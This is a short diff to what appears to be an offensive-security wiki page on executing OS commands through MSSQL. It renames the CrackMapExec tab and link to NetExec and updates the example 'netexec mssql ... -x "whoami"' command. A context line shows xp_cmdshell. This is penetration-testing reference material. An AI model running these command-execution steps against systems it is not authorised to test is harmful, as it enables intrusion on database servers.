@@ -105,11 +105,11 @@ SQL (dbo@master)> xp_cmdshell whoami
 ```
 {% endtab %}
 
-{% tab title="CrackMapExec" %}
-Tools like [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) can be used to execute OS commands from MSSQL
+{% tab title="NetExec" %}
+Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to execute OS commands from MSSQL
 
 ```bash
-crackmapexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
+netexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
 ```
 {% endtab %}
 {% endtabs %}
